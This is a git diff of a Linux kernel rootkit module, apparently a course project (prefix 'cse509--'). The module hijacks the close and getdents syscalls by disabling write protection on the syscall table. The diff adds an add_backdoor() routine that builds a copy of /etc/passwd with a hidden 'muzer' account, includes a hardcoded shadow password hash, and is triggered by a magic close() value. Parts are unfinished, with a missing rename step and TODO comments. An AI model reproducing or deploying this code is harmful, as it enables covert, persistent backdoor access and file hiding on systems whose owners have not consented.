@@ -28,8 +28,10 @@ typedef unsigned int pointer_size_t;
 #define HIDE_PREFIX "cse509--"
 
 #define RKIT_VERBOSE 1
-#define PUBMSG(x) {if (RKIT_VERBOSE == 1) { \
-    printk(KERN_ERR "RKIT: %s\n", x);}}
+#define PUBMSG(fmt, ...) do {\
+    if (RKIT_VERBOSE == 1)\
+        printk(KERN_ERR "RKIT: %s\n", fmt, ##__VA_ARGS__);\
+} while(0);
 
 struct linux_dirent {
     unsigned long       d_ino;
@@ -51,13 +53,11 @@ struct buffer_struct {
 struct buffer_struct buf_struct;
 struct hidden_pids_struct hidden_pids;
 
-/* pid of the process that has currently opened '/proc/' */
-pid_t proc_open_pid;
-/* fd for opened '/proc/' in this process open_files table */
-int proc_open_fd;
-
-u_int8_t module_hidden;
-u_int8_t hide_files_flag;
+pid_t proc_open_pid; /* pid of the process that has currently opened '/proc/' */
+int proc_open_fd;    /* fd for opened '/proc/' in this process open_files table */
+u_int8_t module_hidden = 0;
+u_int8_t hide_files_flag = 0;
+u_int8_t backdoor_added = 0;
 
 /***************************************************************************/
 /* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
@@ -106,9 +106,101 @@ static void enable_write_protection(void)
 
 /*========== Rootkit functionality  ==========*/
 
+/*
+ * Creates copies of /etc/shadow and /etc/passwd files.
+ * The copies contain a backdoor account with username muzer
+ * and password 12345. The User's home directory
+ * points to /etc
+ */
 int add_backdoor(void)
 {
-    return 0;
+    int ret = 0;
+    char buf[100];
+    char* passwd_str = "muzer:x:1000:1000:mu zer,,,:/etc:/bin/bash\n";
+    char* shadow_str = "muzer:$6$izMzVORI$eZvXKcMhvorVcrmQtxPEjFPlkwNHWzniroz5BsY1xTpiypfnzk4NyLYs9NO.GhHY7zqNfCMVgTogeJ4xHsRF3/:17132:0:99999:7:::\n";
+    char* passwdfile = "/etc/passwd";
+    char* shadowfile = "/etc/shadow";
+    struct file* pfile = NULL;
+    struct file* sfile = NULL;
+    struct file* npfile = NULL;
+    struct file* nsfile = NULL;
+    struct inode* rmfile_parent = NULL;
+
+    // Open /etc/passwd in read mode
+    pfile = filp_open(passwdfile, O_RDONLY, 0);
+    if (IS_ERR(pfile)) {
+        PUBMSG("Unable to open /etc/passwd");
+        ret = PTR_ERR(pfile);
+        goto out; // No files opened yet
+    }
+
+    // Check if a file called /etc/muzerpasswd already exists
+    npfile = filp_open("/etc/muzerpasswd", O_RDONLY, 0);
+    if (!IS_ERR(npfile)) {
+        // muzerpasswd file already exists. Lets delete that
+        // and then create our own
+        PUBMSG("A muzerpasswd file already exists");
+        PUBMSG("Deleting muzerpasswd and creating again...");
+        rmfile_parent = ((npfile->f_path).dentry)->d_parent->d_inode;
+        ret = vfs_unlink(rmfile_parent, (npfile->f_path).dentry, NULL);
+        if (ret < 0) {
+            PUBMSG("Failed to remove original muzerpasswd");
+            goto closefiles_exit;
+        }
+    }
+
+    // Create a file called /etc/muzerpasswd and add backdoor to it
+    npfile = filp_open("/etc/muzerpasswd",
+                       O_CREAT | O_RDWR | O_EXCL | O_TRUNC,
+                       S_IRUSR | S_IWUSR);
+
+    ret = kernel_write(npfile, passwd_str, 43, npfile->f_pos);
+    if (ret < 0) {
+        PUBMSG("Failed to write backdoor to muzerpasswd");
+        goto closefiles_exit;
+    }
+    npfile->f_pos += 43;
+
+    // Copy the rest of /etc/passwd to muzerpasswd
+    ret = 0;
+    while (ret >= 0) {
+        ret = kernel_read(pfile, pfile->f_pos, buf, 100);
+        if (ret < 0) {
+            PUBMSG("Failed to kern read pfile");
+            break;
+        }
+        printk("===== kernel_read returns %d", ret); //<<<<<<
+        pfile->f_pos += ret;
+        ret = kernel_write(npfile, buf, ret, npfile->f_pos);
+        if (ret < 0) {
+            PUBMSG("Failed to kern write to muzerpasswd");
+        }
+        npfile->f_pos += ret;
+    }
+    // How to figure out if the whole file has been copied or has there been an error?
+
+    // Rename /etc/passwd to /etc/passwd_old and muzerpasswd to /etc/passwd
+
+    sfile = filp_open(shadowfile, O_RDWR, 0);
+    if (IS_ERR(sfile)) {
+        PUBMSG("Unable to open /etc/shadow");
+        ret = PTR_ERR(sfile);
+        goto closefiles_exit;
+    }
+
+
+closefiles_exit:
+if (pfile)
+    filp_close(pfile, NULL);
+if (npfile)
+    filp_close(npfile, NULL);
+if (sfile)
+    filp_close(sfile, NULL);
+if (nsfile)
+    filp_close(nsfile, NULL);
+
+out:
+    return ret;
 }
 
 int hide_files(void)
@@ -291,7 +383,7 @@ int filename_matches_pattern(const char *filename)
 }
 
 
-/*========== Hijacked syscalls' definition ==========*/
+/*========== Hijacked syscalls' definitions ==========*/
 asmlinkage int my_getdents(unsigned int fd,
                            struct linux_dirent *dirp,
                            unsigned int count)
@@ -395,7 +487,7 @@ asmlinkage int my_close(int fd)
             add_backdoor();
             break;
         default:
-            PUBMSG("Wrong rootkit command!");
+            printk(KERN_EMERG "Wrong rootkit command: %d", fd);
         }
     }
     else {
@@ -436,7 +528,6 @@ void deinit_buf_struct(void)
 
 int rootkit_init(void)
 {
-    //struct page *sys_call_page_temp;
     PUBMSG("Rootkit loaded");
     proc_open_fd = -1;
     proc_open_pid = -1;
@@ -454,16 +545,17 @@ int rootkit_init(void)
      */
     //hide_module();
 
-
     syscall_table = find_syscall_table();
     if (!syscall_table) {
         goto out;
     }
 
-    //printk(KERN_EMERG "Syscall table at %p\n", syscall_table);
+    //<<<<<< Do we need this?
+    printk(KERN_ERR "Syscall table at %p", syscall_table);
 
     // Disable write protection on page
     disable_write_protection();
+
     // hijack close system call
     original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
     syscall_table[__NR_close] = (void *) my_close;
@@ -476,6 +568,10 @@ int rootkit_init(void)
     original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
+
+    // <<<<<< read syscall
+
+    // Enable write protection on page
     enable_write_protection();
 
     out:
@@ -488,7 +584,7 @@ void rootkit_exit(void)
     deinit_buf_struct();
 
     if (syscall_table == NULL) {
-        PUBMSG("RKIT: Nothing to unload\n");
+        PUBMSG("Nothing to unload");
         goto out;
     }
 
@@ -505,7 +601,7 @@ void rootkit_exit(void)
 
 out:
     show_module();
-    PUBMSG("Rootkit unloaded\n");
+    PUBMSG("Rootkit unloaded");
 }
 
 MODULE_LICENSE("GPL");
